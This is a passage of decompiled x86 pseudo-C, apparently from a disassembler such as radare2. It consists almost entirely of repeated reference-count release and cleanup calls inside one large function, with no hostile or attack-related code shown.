iStack2056 = iVar5;\n                    fcn.0040f770();\n                }\n                ppiStack2060 = iStack1824 + -0x10;\n                piVar6 = iStack1824 + -4;\n                LOCK();\n                iVar5 = *piVar6;\n                *piVar6 = *piVar6 + -1;\n                if (iVar5 == 1 || iVar5 + -1 < 0) {\n                    iStack2064 = 0x409814;\n                    (**(**ppiStack2060 + 4))();\n                }\n                ppiStack2060 = 0x409820;\n                fcn.0040f620();\n                iStack2068 = 0x52e800;\n                iStack2064 = 0x409835;\n                iVar5 = fcn.00423f8f();\n                if (iVar5 != 0) {\n                    iStack2064 = 0x52e800;\n                    ppiStack2072 = 0x40984b;\n                    iStack2068 = iVar5;\n                    fcn.0040f770();\n                }\n                ppiStack2072 = iStack860 + -0x10;\n                piVar6 = iStack860 + -4;\n                LOCK();\n                iVar5 = *piVar6;\n                *piVar6 = *piVar6 + -1;\n                if (iVar5 == 1 || iVar5 + -1 < 0) {\n                    uStack2076 = 0x409874;\n                    (**(**ppiStack2072 + 4))();\n                }\n                ppiStack2072 = 0x409880;\n                fcn.0040f620();\n                iStack2080 = 0x52e800;\n                uStack2076 = 0x409895;\n                iVar5 = fcn.00423f8f();\n                if (iVar5 != 0) {\n                    uStack2076 = 0x52e800;\n                    ppiStack2084 = 0x4098ab;\n                    iStack2080 = iVar5;\n                    fcn.0040f770();\n                }\n                ppiStack2084 = iStack1840 + -0x10;\n                piVar6 = iStack1840 + -4;\n                LOCK();\n                iVar5 = *piVar6;\n                *piVar6 = *piVar6 + -1;\n                if (iVar5 == 1 || iVar5 + -1 < 0) {\n                    uStack2088 = 0x4098d4;\n                    (**(**ppiStack2084 + 4))();\n                }\n                ppiStack2084 = 0x4098e0;\n                fcn.0040f620();\n                iStack2092 = 0x52e800;\n                uStack2088 = 0x4098f5;\n                iVar5 = fcn.00423f8f();\n                if (iVar5 != 0) {\n                    uStack2088 = 0x52e800;\n                    ppiStack2096 = 0x40990b;\n                    iStack2092 = iVar5;\n                    fcn.0040f770();\n                }\n                ppiStack2096 = iStack1204 + -0x10;\n                piVar6 = iStack1204 + -4;\n                LOCK();\n                iVar5 = *piVar6;\n                *piVar6 = *piVar6 + -1;\n                if (iVar5 == 1 || iVar5 + -1 < 0) {\n                    uStack2100 = 0x409934;\n                    (**(**ppiStack2096 + 4))();\n                }\n                ppiStack2096 = 0x409940;\n                fcn.0040f620();\n                iStack2104 = 0x52e800;\n                uStack2100 = 0x409955;\n                iVar5 = fcn.00423f8f();\n                if (iVar5 != 0) {\n                    uStack2100 = 0x52e800;\n                    ppiStack2108 = 0x40996b;\n                    iStack2104 = iVar5;\n                    fcn.0040f770();\n                }\n                ppiStack2108 = ppiStack1856 + -0x10;\n                piVar6 = ppiStack1856 + -4;\n                LOCK();\n                iVar5 = *piVar6;\n                *piVar6 = *piVar6 + -1;\n                if (iVar5 == 1 || iVar5 + -1 < 0) {\n                    iStack2112 = 0x409994;\n                    (**(**ppiStack2108 + 4))();\n                }\n                ppiStack2108 = 0x4099a0;\n                fcn.0040f620();\n                iStack2116 = 0x52e800;\n                iStack2112 = 0x4099b5;\n                iVar5 = fcn.00423f8f();\n                if (iVar5 != 0) {\n                    iStack2112 = 0x52e800;\n                    ppiStack2120 = 0x4099cb;\n                    iStack2116 = iVar5;\n                    fcn.0040f770();\n                }\n                ppiStack2120 = iStack604 + -0x10;\n                piVar6 = iStack604 + -4;\n                LOCK();\n                iVar5 = *piVar6;\n                *piVar6 = *piVar6 + -1;\n                if (iVar5 == 1 || iVar5 + -1 < 0) {\n                    uStack2124 = 0x4099f4;\n                    (**(**ppiStack2120 + 4))();\n                }\n                ppiStack2120 = 0x409a00;\n                fcn.0040f620();\n                iStack2128 = 0x52e800;\n                uStack2124 = 0x409a15;\n                iVar5 = fcn.00423f8f();\n                if (iVar5 != 0) {\n                    uStack2124 = 0x52e800;\n                    ppiStack2132 = 0x409a2b;\n                    iStack2128 = iVar5;\n                    fcn.0040f770();\n                }\n                ppiStack2132 = iStack1872 + -0x10;\n                piVar6 = iStack1872 + -4;\n                LOCK();\n                iVar5 = *piVar6;\n                *piVar6 = *piVar6 + -1;\n                if (iVar5 == 1 || iVar5 + -1 < 0) {\n                    uStack2136 = 0x409a54;\n                    (**(**ppiStack2132 + 4))();\n                }\n                ppiStack2132 = 0x409a60;\n                fcn.0040f620();\n                iStack2140 = 0x52e800;\n                uStack2136 = 0x409a75;\n                iVar5 = fcn.00423f8f();\n                if (iVar5 != 0) {\n                    uStack2136 = 0x52e800;\n                    ppiStack2144 = 0x409a8b;\n                    iStack2140 = iVar5;\n                    fcn.0040f770();\n                }\n                ppiStack2144 = iStack1244 + -0x10;\n                piVar6 = iStack1244 + -4;\n                LOCK();\n                iVar5 = *piVar6;\n                *piVar6 = *piVar6 + -1;\n                if (iVar5 == 1 || iVar5 + -1 < 0) {\n                    uStack2148 = 0x409ab4;\n                    (**(**ppiStack2144 + 4))();\n                }\n                ppiStack2144 = 0x409ac0;\n                fcn.0040f620();\n                iStack2152 = 0x52e800;\n                uStack2148 = 0x409ad5;\n                iVar5 = fcn.00423f8f();\n                if (iVar5 != 0) {\n                    uStack2148 = 0x52e800;\n                    ppiStack2156 = 0x409aeb;\n                    iStack2152 = iVar5;\n                    fcn.0040f770();\n                }\n                ppiStack2156 = iStack1888 + -0x10;\n                piVar6 = iStack1888 + -4;\n                LOCK();\n                iVar5 = *piVar6;\n                *piVar6 = *piVar6 + -1;\n                if (iVar5 == 1 || iVar5 + -1 < 0) {\n                    iStack2160 = 0x409b14;\n                    (**(**ppiStack2156 + 4))();\n                }\n                ppiStack2156 = 0x409b20;\n                fcn.0040f620();\n                iStack2164 = 0x52e800;\n                iStack2160 = 0x409b35;\n                iVar5 = fcn.00423f8f();\n                if (iVar5 != 0) {\n                    iStack2160 = 0x52e800;\n                    ppiStack2168 = 0x409b4b;\n                    iStack2164 = iVar5;\n                    fcn.0040f770();\n                }\n                ppiStack2168 = iStack948 + -0x10;\n                piVar6 = iStack948 + -4;\n                LOCK();\n                iVar5 = *piVar6;\n                *piVar6 = *piVar6 + -1;\n                if (iVar5 == 1 || iVar5 + -1 < 0) {\n                    uStack2172 = 0x409b74;\n                    (**(**ppiStack2168 + 4))();\n                }\n                ppiStack2168 = 0x409b80;\n                fcn.0040f620();\n                iStack2176 = 0x52e800;\n                uStack2172 = 0x409b95;\n                iVar5 = fcn.00423f8f();\n                if (iVar5 != 0) {\n                    uStack2172 = 0x52e800;\n                    ppiStack2180 = 0x409bab;\n                    iStack2176 = iVar5;\n                    fcn.0040f770();\n                }\n                ppiStack2180 = ppiStack1904 + -0x10;\n                piVar6 = ppiStack1904 + -4;\n                LOCK();\n                iVar5 = *piVar6;\n                *piVar6 = *piVar6 + -1;\n                if (iVar5 == 1 || iVar5 + -1 < 0) {\n                    (**(**ppiStack2180 + 4))();\n                }\n                ppiStack2180 = 0x409be0;\n                fcn.0040f620();\n                iStack2188 = 0x52e800;\n                iStack2184 = 0x409bf5;\n                iVar5 = fcn.00423f8f();\n                if (iVar5 != 0) {\n                    iStack2184 = 0x52e800;\n                    fcn.0040f770();\n                    iStack2188 = iVar5;\n                }\n                piVar6 = iStack1284 + -4;\n                LOCK();\n                iVar5 = *piVar6;\n                *piVar6 = *piVar6 + -1;\n                if (iVar5 == 1 || iVar5 + -1 < 0) {\n                    (**(**(iStack1284 + -0x10) + 4))();\n                }\n                fcn.0040f620();\n                iVar5 = fcn.00423f8f();\n                if (iVar5 != 0) {\n                    fcn.0040f770();\n                }\n                piVar6 = iStack1920 + -4;\n                LOCK();\n                iVar5 = *piVar6;\n                *piVar6 = *piVar6 + -1;\n                if (iVar5 == 1 || iVar5 + -1 < 0) {\n                    (**(**(iStack1920 + -0x10) + 4))();\n                }\n                fcn.0040f620();\n                iVar5 = fcn.00423f8f();\n                if (iVar5 != 0) {\n                    fcn.0040f770();\n                }\n                piVar6 = iStack836 + -4;\n                LOCK();\n                iVar5 = *piVar6;\n                *piVar6 = *piVar6 + -1;\n                if (iVar5 == 1 || iVar5 + -1 < 0) {\n                    (**(**(iStack836 + -0x10) + 4))();\n                }\n                fcn.0040f620();\n                iVar5 = fcn.00423f8f();\n                if (iVar5 != 0) {\n                    fcn.0040f770();\n                }\n                piVar6 = iStack1936 + -4;\n                LOCK();\n                iVar5 = *piVar6;\n                *piVar6 = *piVar6 + -1;\n                if (iVar5 == 1 || iVar5 + -1 < 0) {\n                    (**(**(iStack1936 + -0x10) + 4))();\n                }\n                fcn.0040f620();\n                iVar5 = fcn.00423f8f();\n                if (iVar5 != 0) {\n                    fcn.0040f770();\n                }\n                piVar6 = iStack1324 + -4;\n                LOCK();\n                iVar5 = *piVar6;\n                *piVar6 = *piVar6 + -1;\n                if (iVar5 == 1 || iVar5 + -1 < 0) {\n                    (**(**(iStack1324 + -0x10) + 4))();\n                }\n                fcn.0040f620();\n                iVar5 = fcn.00423f8f();\n                if (iVar5 != 0) {\n                    fcn.0040f770();\n                }\n                piVar6 = ppiStack1952 + -4;\n                LOCK();\n                iVar5 = *piVar6;\n                *piVar6 = *piVar6 + -1;\n                if (iVar5 == 1 || iVar5 + -1 < 0) {\n                    (**(**(ppiStack1952 + -0x10) + 4))();\n                }\n                fcn.0040f620();\n                iVar5 = fcn.00423f8f();\n                if (iVar5 != 0) {\n                    fcn.0040f770();\n                }\n                piVar6 = iStack1036 + -4;\n                LOCK();\n                iVar5 = *piVar6;\n                *piVar6 = *piVar6 + -1;\n                if (iVar5 == 1 || iVar5 + -1 < 0) {\n                    (**(**(iStack1036 + -0x10) + 4))();\n                }\n                fcn.0040f620();\n                iVar5 = fcn.00423f8f();\n                if (iVar5 != 0) {\n                    fcn.0040f770();\n                }\n                piVar6 = iStack1968 + -4;\n                LOCK();\n                iVar5 = *piVar6;\n                *piVar6 = *piVar6 + -1;\n                if (iVar5 == 1 || iVar5 + -1 < 0) {\n                    (**(**(iStack1968 + -0x10) + 4))();\n                }\n                fcn.0040f620();\n                iVar5 = fcn.00423f8f();\n                if (iVar5 != 0) {\n                    fcn.0040f770();\n                }\n                piVar6 = iStack1364 + -4;\n                LOCK();\n                iVar5 = *piVar6;\n                *piVar6 = *piVar6 + -1;\n                if (iVar5 == 1 || iVar5 + -1 < 0) {\n                    (**(**(iStack1364 + -0x10) + 4))();\n                }\n                fcn.0040f620();\n                iVar5 = fcn.00423f8f();\n                if (iVar5 != 0) {\n                    fcn.0040f770();\n                }\n                piVar6 = iStack1984 + -4;\n                LOCK();\n                iVar5 = *piVar6;\n                *piVar6 = *piVar6 + -1;\n                if (iVar5 == 1 || iVar5 + -1 < 0) {\n                    (**(**(iStack1984 + -0x10) + 4))();\n                }\n                fcn.0040f620();\n                iVar5 = fcn.00423f8f();\n                if (iVar5 != 0) {\n                    fcn.0040f770();\n                }\n                piVar6 = iStack852 + -4;\n                LOCK();\n                iVar5 = *piVar6;\n                *piVar6 = *piVar6 + -1;\n                if (iVar5 == 1 || iVar5 + -1 < 0) {\n                    (**(**(iStack852 + -0x10) + 4))();\n                }\n                fcn.0040f620();\n                iVar5 = fcn.00423f8f();\n                if (iVar5 != 0) {\n                    fcn.0040f770();\n                }\n                piVar6 = ppiStack2000 + -4;\n                LOCK();\n                iVar5 = *piVar6;\n                *piVar6 = *piVar6 + -1;\n                if (iVar5 == 1 || iVar5 + -1 < 0) {\n                    (**(**(ppiStack2000 + -0x10) + 4))();\n                }\n                fcn.0040f620();\n                iVar5 = fcn.00423f8f();\n                if (iVar5 != 0) {\n                    fcn.0040f770();\n                }\n                piVar6 = iStack1404 + -4;\n                LOCK();\n                iVar5 = *piVar6;\n                *piVar6 = *piVar6 + -1;\n                if (iVar5 == 1 || iVar5 + -1 < 0) {\n                    (**(**(iStack1404 + -0x10) + 4))();\n                }\n                fcn.0040f620();\n                iVar5 = fcn.00423f8f();\n                if (iVar5 != 0) {\n                    fcn.0040f770();\n                }\n                piVar6 = iStack2016 + -4;\n                LOCK();\n                iVar5 = *piVar6;\n                *piVar6 = *piVar6 + -1;\n                if (iVar5 == 1 || iVar5 + -1 < 0) {\n                    (**(**(iStack2016 + -0x10) + 4))();\n                }\n                fcn.0040f620();\n                iVar5 = fcn.00423f8f();\n                if (iVar5 != 0) {\n                    fcn.0040f770();\n                }\n                piVar6 = iStack1124 + -4;\n                LOCK();\n                iVar5 = *piVar6;\n                *piVar6 = *piVar6 + -1;\n                if (iVar5 == 1 || iVar5 + -1 < 0) {\n                    (**(**(iStack1124 + -0x10) + 4))();\n                }\n                fcn.0040f620();\n                uStack2368 = 0x52e800;\n                uVar4 = fcn.00423f8f();\n                if (uVar4 != 0) {\n                    fcn.0040f770();\n                    uStack2368 = uVar4;\n                }\n                piVar6 = iStack2032 + -4;\n                LOCK();\n                iVar5 = *piVar6;\n                *piVar6 = *piVar6 + -1;\n                if (iVar5 == 1 || iVar5 + -1 < 0) {\n                    (**(**(iStack2032 + -0x10) + 4))();\n                }\n                fcn.0040f620();\n                iVar5 = fcn.00423f8f();\n                if (iVar5 != 0) {\n                    fcn.0040f770();\n                }\n                piVar6 = iStack1444 + -4;\n                LOCK();\n                iVar5 = *piVar6;\n                *piVar6 = *piVar6 + -1;\n                if (iVar5 == 1 || iVar5 + -1 < 0) {\n                    (**(**(iStack1444 + -0x10) + 4))();\n                }\n                fcn.0040f620();\n                iVar5 = fcn.00423f8f();\n                if (iVar5 != 0) {\n                    fcn.0040f770();\n                }\n                piVar6 = ppiStack2048 + -4;\n                LOCK();\n                iVar5 = *piVar6;\n                *piVar6 = *piVar6 + -1;\n                if (iVar5 == 1 || iVar5 + -1 < 0) {\n                    (**(**(ppiStack2048 + -0x10) + 4))();\n                }\n                fcn.0040f620();\n                iVar5 = fcn.00423f8f();\n                if (iVar5 != 0) {\n                    fcn.0040f770();\n                }\n                piVar6 = iStack1020 + -4;\n                LOCK();\n                iVar5 = *piVar6;\n                *piVar6 = *piVar6 + -1;\n                if (iVar5 == 1 || iVar5 + -1 < 0) {\n                    (**(**(iStack1020 + -0x10) + 4))();\n                }\n                fcn.0040f620();\n                iVar5 = fcn.00423f8f();\n                if (iVar5 != 0) {\n                    fcn.0040f770();\n                }\n                piVar6 = iStack2064 + -4;\n                LOCK();\n                iVar5 = *piVar6;\n                *piVar6 = *piVar6 + -1;\n                if (iVar5 == 1 || iVar5 + -1 < 0) {\n                    (**(**(iStack2064 + -0x10) + 4))();\n                }\n                fcn.0040f620();\n                iVar5 = fcn.00423f8f();\n                if (iVar5 != 0) {\n                    fcn.0040f770();\n                }\n                piVar6 = ppiStack1484 + -4;\n                LOCK();\n                iVar5 = *piVar6;\n                *piVar6 = *piVar6 + -1;\n                if (iVar5 == 1 || iVar5 + -1 < 0) {\n                    (**(**(ppiStack1484 + -0x10) + 4))();\n                }\n                fcn.0040f620();\n                iVar5 = fcn.00423f8f();\n                if (iVar5 != 0) {\n                    fcn.0040f770();\n                }\n                piVar6 = iStack2080 + -4;\n                LOCK();\n                iVar5 = *piVar6;\n                *piVar6 = *piVar6 + -1;\n                if (iVar5 == 1 || iVar5 + -1 < 0) {\n                    (**(**(iStack2080 + -0x10) + 4))();\n                }\n                fcn.0040f620();\n                iVar5 = fcn.00423f8f();\n                if (iVar5 != 0) {\n                    fcn.0040f770();\n                }\n                piVar6 = iStack1212 + -4;\n                LOCK();\n                iVar5 = *piVar6;\n                *piVar6 = *piVar6 + -1;\n                if (iVar5 == 1 || iVar5 + -1 < 0) {\n                    (**(**(iStack1212 + -0x10) + 4))();\n                }\n                fcn.0040f620();\n                iVar5 = fcn.00423f8f();\n                if (iVar5 != 0) {\n                    fcn.0040f770();\n                }\n                piVar6 = ppiStack2096 + -4;\n                LOCK();\n                iVar5 = *piVar6;\n                *piVar6 = *piVar6 + -1;\n                if (iVar5 == 1 || iVar5 + -1 < 0) {\n                    (**(**(ppiStack2096 + -0x10) + 4))();\n                }\n                fcn.0040f620();\n                iVar5 = fcn.00423f8f();\n                if (iVar5 != 0) {\n                    fcn.0040f770();\n                }\n                piVar6 = iStack1524 + -4;\n                LOCK();\n                iVar5 = *piVar6;\n                *piVar6 = *piVar6 + -1;\n                if (iVar5 == 1 || iVar5 + -1 < 0) {\n                    (**(**(iStack1524 + -0x10) + 4))();\n                }\n                fcn.0040f620();\n                iVar5 = fcn.00423f8f();\n                if (iVar5 != 0) {\n                    fcn.0040f770();\n                }\n                piVar6 = iStack2112 + -4;\n                LOCK();\n                iVar5 = *piVar6;\n                *piVar6 = *piVar6 + -1;\n                if (iVar5 == 1 || iVar5 + -1 < 0) {\n                    (**(**(iStack2112 + -0x10) + 4))();\n                }\n                fcn.0040f620();\n                iVar5 = fcn.00423f8f();\n                if (iVar5 != 0) {\n                    fcn.0040f770();\n                }\n                piVar6 = iStack1004 + -4;\n                LOCK();\n                iVar5 = *piVar6;\n                *piVar6 = *piVar6 + -1;\n                if (iVar5 == 1 || iVar5 + -1 < 0) {\n                    (**(**(iStack1004 + -0x10) + 4))();\n                }\n                fcn.0040f620();\n                iVar5 = fcn.00423f8f();\n                if (iVar5 != 0) {\n                    fcn.0040f770();\n                }\n                piVar6 = iStack2128 + -4;\n                LOCK();\n                iVar5 = *piVar6;\n                *piVar6 = *piVar6 + -1;\n                if (iVar5 == 1 || iVar5 + -1 < 0) {\n                    (**(**(iStack2128 + -0x10) + 4))();\n                }\n                fcn.0040f620();\n                iVar5 = fcn.00423f8f();\n                if (iVar5 != 0) {\n                    fcn.0040f770();\n                }\n                piVar6 = iStack1564 + -4;\n                LOCK();\n                iVar5 = *piVar6;\n                *piVar6 = *piVar6 + -1;\n                if (iVar5 == 1 || iVar5 + -1 < 0) {\n                    (**(**(iStack1564 + -0x10) + 4))();\n                }\n                fcn.0040f620();\n                iVar5 = fcn.00423f8f();\n                if (iVar5 != 0) {\n                    fcn.0040f770();\n                }\n                piVar6 = ppiStack2144 + -4;\n                LOCK();\n                iVar5 = *piVar6;\n                *piVar6 = *piVar6 + -1;\n                if (iVar5 == 1 || iVar5 + -1 < 0) {\n                    (**(**(ppiStack2144 + -0x10) + 4))();\n                }\n                fcn.0040f620();\n                iVar5 = fcn.00423f8f();\n                if (iVar5 != 0) {\n                    fcn.0040f770();\n                }\n                piVar6 = iStack1300 + -4;\n                LOCK();\n                iVar5 = *piVar6;\n                *piVar6 = *piVar6 + -1;\n                if (iVar5 == 1 || iVar5 + -1 < 0) {\n                    (**(**(iStack1300 + -0x10) + 4))();\n                }\n                fcn.0040f620();\n                iVar5 = fcn.00423f8f();\n                if (iVar5 != 0) {\n                    fcn.0040f770();\n                }\n                piVar6 = iStack2160 + -4;\n                LOCK();\n                iVar5 = *piVar6;\n                *piVar6 = *piVar6 + -1;\n                if (iVar5 == 1 || iVar5 + -1 < 0) {\n                    (**(**(iStack2160 + -0x10) + 4))();\n                }\n                fcn.0040f620();\n                iVar5 = fcn.00423f8f();\n                if (iVar5 != 0) {\n                    fcn.0040f770();\n                }\n                piVar6 = ppiStack1604 + -4;\n                LOCK();\n                iVar5 = *piVar6;\n                *piVar6 = *piVar6 + -1;\n                if (iVar5 == 1 || iVar5 + -1 < 0) {\n                    (**(**(ppiStack1604 + -0x10) + 4))();\n                }\n                fcn.0040f620();\n                iVar5 = fcn.00423f8f();\n                if (iVar5 != 0) {\n                    fcn.0040f770();\n                }\n                piVar6 = iStack2176 + -4;\n                LOCK();\n                iVar5 = *piVar6;\n                *piVar6 = *piVar6 + -1;\n                if (iVar5 == 1 || iVar5 + -1 < 0) {\n                    (**(**(iStack2176 + -0x10) + 4))();\n                }\n                fcn.0040f620();\n                iVar5 = fcn.00423f8f();\n                if (iVar5 != 0) {\n                    fcn.0040f770();\n                }\n                piVar6 = iStack1204 + -4;\n                LOCK();\n                iVar5 = *piVar6;\n                *piVar6 = *piVar6 + -1;\n                if (iVar5 == 1 || iVar5 + -1 < 0) {\n                    (**(**(iStack1204 + -0x10) + 4))();\n                }\n                fcn.0040f620();\n                fcn.0040f670();\n                piVar6 = iStack2184 + -4;\n                LOCK();\n                iVar5 = *piVar6;\n                *piVar6 = *piVar6 + -1;\n                if (iVar5 == 1 || iVar5 + -1 < 0) {\n                    (**(**(iStack2184 + -0x10) + 4))();\n                }\n                fcn.0040f620();\n                fcn.0040f670();\n                piVar6 = ppiStack1628 + -4;\n                LOCK();\n                iVar5 = *piVar6;\n                *piVar6 = *piVar6 + -1;\n                if (iVar5 == 1 || iVar5 + -1 < 0) {\n                    (**(**(ppiStack1628 + -0x10) + 4))();\n                }\n                fcn.0040f620();\n                fcn.0040f670();\n                piVar6 = iStack2184 + -4;\n                LOCK();\n                iVar5 = *piVar6;\n                *piVar6 = *piVar6 + -1;\n                if (iVar5 == 1 || iVar5 + -1 < 0) {\n                    (**(**(iStack2184 + -0x10) + 4))();\n                }\n                fcn.0040f620();\n                fcn.0040f670();\n                piVar6 = iStack1356 + -4;\n                LOCK();\n                iVar5 = *piVar6;\n                *piVar6 = *piVar6 + -1;\n                if (iVar5 == 1 || iVar5 + -1 < 0) {\n                    (**(**(iStack1356 + -0x10) + 4))();\n                }\n                fcn.0040f620();\n                fcn.0040f670();\n                piVar6 = iStack2184 + -4;\n                LOCK();\n                iVar5 = *piVar6;\n                *piVar6 = *piVar6 + -1;\n                if (iVar5 == 1 || iVar5 + -1 < 0) {\n                    (**(**(iStack2184 + -0x10) + 4))();\n                }\n                fcn.0040f620();\n                fcn.0040f670();\n                piVar6 = iStack1636 + -4;\n                LOCK();\n                iVar5 = *piVar6;\n                *piVar6 = *piVar6 + -1;\n                if (iVar5 == 1 || iVar5 + -1 < 0) {\n                    (**(**(iStack1636 + -0x10) + 4))();\n                }\n                fcn.0040f620();\n                fcn.0040f670();\n                piVar6 = iStack2184 + -4;\n                LOCK();\n                iVar5 = *piVar6;\n                *piVar6 = *piVar6 + -1;\n                if (iVar5 == 1 || iVar5 + -1 < 0) {\n                    (**(**(iStack2184 + -0x10) + 4))();\n                }\n                fcn.0040f620();\n                fcn.0040f670();\n                piVar6 = iStack1164 + -4;\n                LOCK();\n                iVar5 = *piVar6;\n                *piVar6 = *piVar6 + -1;\n                if (iVar5 == 1 || iVar5 + -1 < 0) {\n                    (**(**(iStack1164 + -0x10) + 4))();\n                }\n                fcn.0040f620();\n                fcn.0040f670();\n                piVar6 = iStack2184 + -4;\n                LOCK();\n                iVar5 = *piVar6;\n                *piVar6 = *piVar6 + -1;\n                if (iVar5 == 1 || iVar5 + -1 < 0) {\n                    (**(**(iStack2184 + -0x10) + 4))();\n                }\n                fcn.0040f620();\n                fcn.0040f670();\n                piVar6 = iStack1644 + -4;\n                LOCK();\n                iVar5 = *piVar6;\n                *piVar6 = *piVar6 + -1;\n                if (iVar5 == 1 || iVar5 + -1 < 0) {\n                    (**(**(iStack1644 + -0x10) + 4))();\n                }\n                fcn.0040f620();\n                fcn.0040f670();\n                piVar6 = iStack2184 + -4;\n                LOCK();\n                iVar5 = *piVar6;\n                *piVar6 = *piVar6 + -1;\n                if (iVar5 == 1 || iVar5 + -1 < 0) {\n                    (**(**(iStack2184 + -0x10) + 4))();\n                }\n                fcn.0040f620();\n                fcn.0040f670();\n                piVar6 = iStack1380 + -4;\n                LOCK();\n                iVar5 = *piVar6;\n                *piVar6 = *piVar6 + -1;\n                if (iVar5 == 1 || iVar5 + -1 < 0) {\n                    (**(**(iStack1380 + -0x10) + 4))();\n                }\n                fcn.0040f620();\n                fcn.0040f670();\n                piVar6 = iStack2184 + -4;\n                LOCK();\n                iVar5 = *piVar6;\n                *piVar6 = *piVar6 + -1;\n                if (iVar5 == 1 || iVar5 + -1 < 0) {\n                    (**(**(iStack2184 + -0x10) + 4))();\n                }\n                fcn.0040f620();\n                fcn.0040f670();\n                piVar6 = ppiStack1652 + -4;\n                LOCK();\n                iVar5 = *piVar6;\n                *piVar6 = *piVar6 + -1;\n                if (iVar5 == 1 || iVar5 + -1 < 0) {\n                    (**(**(ppiStack1652 + -0x10) + 4))();\n                }\n                fcn.0040f620();\n                fcn.0040f670();\n                piVar6 = iStack2184 + -4;\n                LOCK();\n                iVar5 = *piVar6;\n                *piVar6 = *piVar6 + -1;\n                if (iVar5 == 1 || iVar5 + -1 < 0) {\n                    (**(**(iStack2184 + -0x10) + 4))();\n                }\n                fcn.0040f620();\n                fcn.0040f670();\n                piVar6 = iStack1260 + -4;\n                LOCK();\n                iVar5 = *piVar6;\n                *piVar6 = *piVar6 + -1;\n                if (iVar5 == 1 || iVar5 + -1 < 0) {\n                    (**(**(iStack1260 + -0x10) + 4))();\n                }\n                fcn.0040f620();\n                fcn.0040f670();\n                piVar6 = iStack2184 + -4;\n                LOCK();\n                iVar5 = *piVar6;\n                *piVar6 = *piVar6 + -1;\n                if (iVar5 == 1 || iVar5 + -1 < 0) {\n                    (**(**(iStack2184 + -0x10) + 4))();\n                }\n                fcn.0040f620();\n                fcn.0040f670();\n                piVar6 = iStack1660 + -4;\n                LOCK();\n                iVar5 = *piVar6;\n                *piVar6 = *piVar6 + -1;\n                if (iVar5 == 1 || iVar5 + -1 < 0) {\n                    (**(**(iStack1660 + -0x10) + 4))();\n                }\n                fcn.0040f620();\n                fcn.0040f670();\n                piVar6 = iStack2184 + -4;\n                LOCK();\n                iVar5 = *piVar6;\n                *piVar6 = *piVar6 + -1;\n                if (iVar5 == 1 || iVar5 + -1 < 0) {\n                    (**(**(iStack2184 + -0x10) + 4))();\n                }\n                fcn.0040f620();\n                fcn.0040f670();\n                piVar6 = iStack1404 + -4;\n                LOCK();\n                iVar5 = *piVar6;\n                *piVar6 = *piVar6 + -1;\n                if (iVar5 == 1 || iVar5 + -1 < 0) {\n                    (**(**(iStack1404 + -0x10) + 4))();\n                }\n                fcn.0040f620();\n                fcn.0040f670();\n                piVar6 = iStack2184 + -4;\n                LOCK();\n                iVar5 = *piVar6;\n                *piVar6 = *piVar6 + -1;\n                if (iVar5 == 1 || iVar5 + -1 < 0) {\n                    (**(**(iStack2184 + -0x10) + 4))();\n                }\n                fcn.0040f620();\n                fcn.0040f670();\n                piVar6 = iStack1668 + -4;\n                LOCK();\n                iVar5 = *piVar6;\n                *piVar6 = *piVar6 + -1;\n                if (iVar5 == 1 || iVar5 + -1 < 0) {\n                    (**(**(iStack1668 + -0x10) + 4))();\n                }\n                fcn.0040f620();\n                fcn.0040f670();\n                piVar6 = iStack2184 + -4;\n                LOCK();\n                iVar5 = *piVar6;\n                *piVar6 = *piVar6 + -1;\n                if (iVar5 == 1 || iVar5 + -1 < 0) {\n                    (**(**(iStack2184 + -0x10) + 4))();\n                }\n                fcn.0040f620();\n                fcn.0040f670();\n                piVar6 = iStack1164 + -4;\n                LOCK();\n                iVar5 = *piVar6;\n                *piVar6 = *piVar6 + -1;\n                if (iVar5 == 1 || iVar5 + -1 < 0) {\n                    (**(**(iStack1164 + -0x10) + 4))();\n                }\n                fcn.0040f620();\n                fcn.0040f670();\n                piVar6 = iStack2184 + -4;\n                LOCK();\n                iVar5 = *piVar6;\n                *piVar6 = *piVar6 + -1;\n                if (iVar5 == 1 || iVar5 + -1 < 0) {\n                    (**(**(iStack2184 + -0x10) + 4))();\n                }\n                fcn.0040f620();\n                fcn.0040f670();\n                piVar6 = ppiStack1676 + -4;\n                LOCK();\n                iVar5 = *piVar6;\n                *piVar6 = *piVar6 + -1;\n                if (iVar5 == 1 || iVar5 + -1 < 0) {\n                    (**(**(ppiStack1676 + -0x10) + 4))();\n                }\n                fcn.0040f620();\n                fcn.0040f670();\n                piVar6 = iStack2184 + -4;\n                LOCK();\n                iVar5 = *piVar6;\n                *piVar6 = *piVar6 + -1;\n                if (iVar5 == 1 || iVar5 + -1 < 0) {\n                    (**(**(iStack2184 + -0x10) + 4))();\n                }\n                fcn.0040f620();\n                fcn.0040f670();\n                piVar6 = iStack1428 + -4;\n                LOCK();\n                iVar5 = *piVar6;\n                *piVar6 = *piVar6 + -1;\n                if (iVar5 == 1 || iVar5 + -1 < 0) {\n                    (**(**(iStack1428 + -0x10) + 4))();\n                }\n                fcn.0040f620();\n                fcn.0040f670();\n                piVar6 = iStack2184 + -4;\n                LOCK();\n                iVar5 = *piVar6;\n                *piVar6 = *piVar6 + -1;\n                if (iVar5 == 1 || iVar5 + -1 < 0) {\n                    (**(**(iStack2184 + -0x10) + 4))();\n                }\n                fcn.0040f620();\n                fcn.0040f670();\n                piVar6 = iStack1684 + -4;\n                LOCK();\n                iVar5 = *piVar6;\n                *piVar6 = *piVar6 + -1;\n                if (iVar5 == 1 || iVar5 + -1 < 0) {\n                    (**(**(iStack1684 + -0x10) + 4))();\n                }\n                fcn.0040f620();\n                fcn.0040f670();\n                piVar6 = iStack2184 + -4;\n                LOCK();\n                iVar5 = *piVar6;\n                *piVar6 = *piVar6 + -1;\n                if (iVar5 == 1 || iVar5 + -1 < 0) {\n                    (**(**(iStack2184 + -0x10) + 4))();\n                }\n                fcn.0040f620();\n                fcn.0040f670();\n                piVar6 = iStack1316 + -4;\n                LOCK();\n                iVar5 = *piVar6;\n                *piVar6 = *piVar6 + -1;\n                if (iVar5 == 1 || iVar5 + -1 < 0) {\n                    (**(**(iStack1316 + -0x10) + 4))();\n                }\n                fcn.0040f620();\n                fcn.0040f670();\n                piVar6 = iStack2184 + -4;\n                LOCK();\n                iVar5 = *piVar6;\n                *piVar6 = *piVar6 + -1;\n                if (iVar5 == 1 || iVar5 + -1 < 0) {\n                    (**(**(iStack2184 + -0x10) + 4))();\n                }\n                fcn.0040f620();\n                fcn.0040f670();\n                piVar6 = iStack1692 + -4;\n                LOCK();\n                iVar5 = *piVar6;\n                *piVar6 = *piVar6 + -1;\n                if (iVar5 == 1 || iVar5 + -1 < 0) {\n                    (**(**(iStack1692 + -0x10) + 4))();\n                }\n                fcn.0040f620();\n                